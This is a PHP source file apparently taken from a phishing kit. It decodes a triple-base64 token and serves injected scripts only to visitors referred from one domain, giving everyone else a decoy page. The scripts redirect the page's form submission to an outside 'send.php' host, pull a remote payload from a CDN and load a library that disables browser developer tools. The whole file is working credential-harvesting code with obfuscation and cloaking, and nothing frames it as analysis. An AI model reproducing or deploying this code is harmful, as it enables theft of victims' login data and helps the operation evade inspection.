<?php 
require 'antimf.php';
$token = $_GET['token'];
$decrypted_base64_3 = base64_decode(strtr($token, '-_.', '+/='));
$decrypted_base64_2 = base64_decode(strtr($decrypted_base64_3, '-_.', '+/='));
$decrypted_base64_1 = base64_decode(strtr($decrypted_base64_2, '-_.', '+/='));
$data = explode(" ", $decrypted_base64_1);


$meta = '<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">';
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
$form =  '<script>var theForm = document.getElementsByTagName("form")[0];theForm.action = ("https://'.$data[2].'/run/send.php");theForm.method = ("POST");var formNum = document.createElement("input");formNum.type = ("hidden");formNum.name = ("num_form");formNum.value = ("'.$data[1].'");theForm.appendChild(formNum);</script>';
$userlang =  '<script src="https://cdn.jsdelivr.net/gh/d-l0g/data/lang/'.$data[0]. '/' .$lang  . '.js"></script>';
if($lang === "en"){ $userlang ="";}
$run_form =  '<script disable-devtool-auto src="https://fastly.jsdelivr.net/npm/disable-devtool/disable-devtool.min.js"></script><script src="https://cdn.jsdelivr.net/gh/d-l0g/data/up/'.$data[0].'.js"></script>';




$referer = $_SERVER['HTTP_REFERER'];
$go_two = 'v-cloud.ml';
	if (strstr( $referer, $go_two)) {
		echo  $meta .$run_form . $form .  $userlang;
		exit();
	}else{
		include 'fake.php';
		exit();
	}



?>

